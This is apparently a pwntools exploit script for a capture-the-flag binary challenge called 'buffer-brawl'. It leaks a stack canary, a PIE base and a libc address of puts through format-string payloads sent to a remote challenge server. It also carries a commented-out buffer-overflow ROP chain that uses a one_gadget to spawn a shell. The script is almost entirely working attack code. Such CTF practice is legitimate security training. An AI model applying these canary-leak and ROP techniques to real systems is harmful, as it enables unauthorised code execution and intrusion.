#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

#b *stack_check_up+137
gs = '''
b main
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("buffer-brawl.chal.wwctf.com", 1337)
    else:
        return process(elf.path)

# Plan:

# Addresses
offset_can = 24
libc_start_main_109 = 0x2bffd
one_offset = 0xd23e1 # ok
pop_r12_pop_r13_ret = 0x9d74f # ok
main_215_off = 0x1747
puts_glibc = 0x3fa0 # objdump -d chall | grep puts. Take puts@glibc.2.2.5

# Functions
def uppercut():
    print(io.sendlineafter(b"> ",b"3"))


io = start()

io.sendlineafter(b"> ", b"4") # slip
io.sendlineafter(b"Right or left?", b"%11$p.%13$p") # This will leak 'canary.main+215'
io.recvline()
leak = io.recvline().strip().split(b".")

canary = int(leak[0], 16)
log.info("Canary: %s" % hex(canary))

pie_leak = int(leak[1], 16) 
pie_base = pie_leak - main_215_off

log.info("Pie base: %s" % hex(pie_base))

puts_addr = pie_base + puts_glibc
log.info("Puts pie: %s" % hex(puts_addr))

# Leak puts remotely now

payload = b"%7$sPWNY" + p64(puts_addr)

io.sendlineafter(b"> ", b"4")
io.sendlineafter(b"Right or left?", payload)
libc_leak = u64(io.recvuntil(b"PWNY")[:-4].strip().ljust(8,b"\x00"))
log.info("Libc leak: %s" % hex(libc_leak)) # This is puts libc and can be used to check libc version with libcdb or libc.rip


"""

payload = p64(0)*3 + p64(canary) + b"B"*8 + p64(libc_base + pop_r12_pop_r13_ret) + p64(0) + p64(0) + p64(one_gadget)


for i in range(29):
    uppercut()

print(io.sendlineafter(b"Enter your move:", payload))
"""


io.interactive()
